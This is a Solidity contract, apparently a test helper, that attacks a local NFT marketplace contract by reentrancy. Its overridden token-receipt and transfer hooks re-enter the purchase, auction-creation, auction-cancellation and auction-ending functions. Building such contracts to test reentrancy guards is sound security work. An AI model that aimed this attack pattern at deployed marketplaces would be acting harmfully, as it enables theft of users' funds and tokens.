// SPDX-License-Identifier: MIT
pragma solidity 0.8.16;

import "./NFTMarketplace.sol";
import "@openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract NFTAttacker is ERC721URIStorage, IERC721Receiver {
	enum FunctionNames {
		NONE,
		PURCHASE,
		CREATE_AUCTION,
		CANCEL_AUCTION,
		END_AUCTION,
		WITHDRAW_BID
	}

	using Counters for Counters.Counter;
	Counters.Counter private _tokenIdCounter;
	NFTMarketplace public lmaNFTMarketplace;
	IERC721 public attackedNFT;
	uint public attackedTokenId;
	bytes32 public attackedKey;
	uint public attackerBalance;
	bytes4 public attackedFunctionSelector;
	FunctionNames public attackedFunction;
	// values to attacke the createListing function
	uint attackedPrice;
	uint attackedStartTimestamp;
	uint attackedEndTimestamp;

	constructor(
		string memory name_,
		string memory symbol_,
		address lmaNFTMartketplaceAddress
	) ERC721(name_, symbol_) {
		lmaNFTMarketplace = NFTMarketplace(lmaNFTMartketplaceAddress);
		attackedFunction = FunctionNames.NONE;
	}

	/**
	 * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
	 * by `operator` from `from`, this function is called.
	 *
	 * It must return its Solidity selector to confirm the token transfer.
	 * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
	 *
	 * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
	 */
	function onERC721Received(
		address operator,
		address from,
		uint256 tokenId,
		bytes calldata data
	) external returns (bytes4) {
		if (attackedFunction == FunctionNames.NONE) {
			return this.onERC721Received.selector;
		} else if (attackedFunction == FunctionNames.PURCHASE) {
			// Attempt to reenter purchase function
			if (address(lmaNFTMarketplace).balance >= 1 ether) {
				lmaNFTMarketplace.purchase{ value: attackerBalance }(attackedNFT, attackedTokenId);
			}
		} else if (attackedFunction == FunctionNames.CANCEL_AUCTION) {
			// Attempt to reenter cancelAuction function
			lmaNFTMarketplace.cancelAuction(attackedKey);
		} else if (attackedFunction == FunctionNames.END_AUCTION) {
			// Attempt to reenter endAuction function
			lmaNFTMarketplace.endAuction(attackedKey);
		}

		attackedFunction = FunctionNames.NONE;
	}

	/**
	 * @dev See {IERC721-safeTransferFrom}.
	 * Override function to trigger re-entrancy attacks
	 */
	function safeTransferFrom(
		address from,
		address to,
		uint256 tokenId,
		bytes memory data
	) public override {
		require(
			_isApprovedOrOwner(_msgSender(), tokenId),
			"ERC721: caller is not token owner or approved"
		);

		if (attackedFunction == FunctionNames.CREATE_AUCTION) {
			// Attemp to reenter createAuction function. We don't care about the parameters so we can set to 0
			lmaNFTMarketplace.createAuction(IERC721(this), tokenId, 0, 0, 0);
			attackedFunction = FunctionNames.NONE;
		}

		_safeTransfer(from, to, tokenId, data);
	}

	function safeMint(string memory uri, address to) public payable returns (uint256) {
		_tokenIdCounter.increment();
		uint256 tokenId = _tokenIdCounter.current();
		_mint(to, tokenId);
		_setTokenURI(tokenId, uri);
		return tokenId;
	}

	/**
	 * @dev See {ERC721-_burn}. This override additionally checks to see if a
	 * token-specific URI was set for the token, and if so, it deletes the token URI from
	 * the storage mapping.
	 */
	function _burn(uint256 tokenId) internal override {
		super._burn(tokenId);
	}

	// Reentrancy attack related functions
	// Attack listings
	function attackPurchase(IERC721 nft, uint256 tokenId) external payable {
		require(msg.value >= 2 ether);
		// Set the function that we want to attack
		attackedNFT = nft;
		attackedTokenId = tokenId;
		attackedFunction = FunctionNames.PURCHASE;
		attackerBalance = msg.value - 2 ether;
		lmaNFTMarketplace.purchase{ value: 2 ether }(nft, tokenId);
	}

	// List a token using the attacker contract. This is necessary in order to attack cancel listing token
	/* function _createListing(
		uint tokenId,
		uint price
	) internal {
		lmaNFTMarketplace.createListing(
			IERC721(this),
			tokenId,
			price
		);
	} */

	// Attack auctions
	// List a token using the attacker contract. This is necessary in order to attack cancel listing token
	function approveAndCreateAuction(
		uint tokenId,
		uint price,
		uint startTimestamp,
		uint endTimestamp
	) public {
		approve(address(lmaNFTMarketplace), tokenId);

		lmaNFTMarketplace.createAuction(
			IERC721(this),
			tokenId,
			price,
			startTimestamp,
			endTimestamp
		);
	}

	function attackCreateAuction(
		uint tokenId,
		uint price,
		uint startTimestamp,
		uint endTimestamp
	) external {
		// Now we set the attackedFunction so we can reenter createListing function
		attackedFunction = FunctionNames.CREATE_AUCTION;
		// calculate the listing key that will be attacked
		attackedKey = keccak256(abi.encodePacked(address(this), tokenId));
		// Create the listing that will be used to attacked cancelListing function
		approveAndCreateAuction(tokenId, price, startTimestamp, endTimestamp);
	}

	function attackCancelAuction(
		uint tokenId,
		uint price,
		uint startTimestamp,
		uint endTimestamp
	) external {
		// Create the listing that will be used to attack cancelListing function
		approveAndCreateAuction(tokenId, price, startTimestamp, endTimestamp);
		// calculate and key the listing key that will be attacked
		attackedKey = keccak256(abi.encodePacked(address(this), tokenId));
		// set the name of the function that we want to attack
		attackedFunction = FunctionNames.CANCEL_AUCTION;
		// Call cancelAuction for the first time
		lmaNFTMarketplace.cancelAuction(attackedKey);
	}

	function attackEndAuction(uint tokenId) external {
		// calculate and key the listing key that will be attacked
		attackedKey = keccak256(abi.encodePacked(address(this), tokenId));
		// set the name of the function that we want to attack
		attackedFunction = FunctionNames.END_AUCTION;
		// Call endAuction for the first time
		lmaNFTMarketplace.endAuction(attackedKey);
	}

	/// @dev allow contract to receive ether
	receive() external payable {

    }
}
